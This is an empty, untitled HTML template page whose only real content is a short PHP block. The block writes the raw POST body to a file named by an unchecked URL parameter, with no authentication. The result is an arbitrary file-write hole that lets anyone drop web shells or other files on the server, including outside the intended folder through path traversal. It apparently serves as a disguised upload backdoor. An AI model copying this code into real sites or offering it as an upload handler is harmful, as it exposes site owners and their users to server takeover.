<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<!-- TemplateBeginEditable name="doctitle" -->
<title>Documento sem título</title>
<!-- TemplateEndEditable -->
<!-- TemplateBeginEditable name="head" -->
<!-- TemplateEndEditable -->
</head>

<body>


<?php
if ( isset ( $GLOBALS["HTTP_RAW_POST_DATA"] )) {
    $flux = $GLOBALS["HTTP_RAW_POST_DATA"];
    $fp = fopen('.images/' . $_GET['file'], 'wb');
    fwrite($fp, $flux);
    fclose($fp);
}
?>

</body>
</html>
